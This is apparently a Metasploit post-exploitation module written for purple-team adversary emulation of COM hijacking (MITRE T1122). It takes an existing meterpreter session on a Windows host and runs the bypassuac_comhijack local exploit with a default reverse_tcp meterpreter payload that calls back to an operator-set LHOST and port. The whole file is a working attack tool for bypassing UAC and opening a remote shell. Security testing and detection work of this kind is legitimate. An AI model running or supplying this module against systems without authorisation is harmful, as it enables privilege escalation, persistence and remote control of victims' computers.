##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Registry
  include Msf::Post::Windows::Priv

  def initialize(info={})
    super(update_info(info,
      'Name'                 => "Component Object Model Hijacking (T1122) Windows - Purple Team",
      'Description'          => %q{
        Defense Evasion, Persistence:
        The Microsoft Component Object Model (COM) is a system within Windows to enable interaction between software components through the operating system. Adversaries can use this system to insert malicious code that can be executed in place of legitimate software through hijacking the COM references and relationships as a means for persistence. Hijacking a COM object requires a change in the Windows Registry to replace a reference to a legitimate system component which may cause that component to not work when executed. When that system component is executed through normal system operation the adversary's code will be executed instead. An adversary is likely to hijack objects that are used frequently enough to maintain a consistent level of persistence, but are unlikely to break noticeable functionality within the system as to avoid system instability that could lead to detection. },
      'License'       => MSF_LICENSE,
      'Author'        => [ 'Praetorian' ],
      'References'    => [ [ 'URL', 'https://attack.mitre.org/wiki/Technique/T1122' ] ],
      'Platform'      => [ 'win' ],
      'SessionTypes'  => [ 'meterpreter' ]
     ))
    register_options(
    [
      OptString.new("MODULE", [ true, "Module to execute", 'exploit/windows/local/bypassuac_comhijack']),
      OptAddress.new('LHOST', [ true, "Local Address for callback handler", ""]),
      OptPort.new("LPORT", [false, "Local Port for callback handler",4444]),
      OptString.new('PAYLOAD', [ false, "Meterpreter Payload to use", "windows/meterpreter/reverse_tcp"]),
    ])
  end

  def run_module(mod)
      framework_mod = framework.modules.create(mod)
      payload = datastore['PAYLOAD']
      framework_mod.datastore['SESSION'] = datastore['SESSION']
      framework_mod.datastore['VERBOSE'] = datastore['VERBOSE']
      framework_mod.datastore['WORKSPACE'] = datastore["WORKSPACE"] if datastore["WORKSPACE"]
      framework_mod.datastore['DisablePayloadHandler'] = false
      framework_mod.datastore['LHOST'] = datastore['LHOST']
      framework_mod.datastore['LPORT'] = datastore['LPORT']
      framework.datastore['ExitOnSession'] = false
      framework_mod.exploit_simple(
          'LocalInput'    => self.user_input,
          'LocalOutput'   => self.user_output,
          'Quiet'       => false,
          'Payload'   => payload,
          'RunAsJob'  => true)
  end

  def run
    return 0 if session.type != "meterpreter"

    if is_admin?
      fail_with(Failure::NoAccess, "The current session has administrative rights. Re-run the module as a user.")
    end

    mod = datastore['MODULE']

    begin
        print_status("Executing '#{mod}' on #{session.inspect}")
        run_module(mod)
        print_good("Successful execution!")
    rescue ::Exception => e
        print_error("Unable to execute: #{e.message}")
        return
    end
  end
end
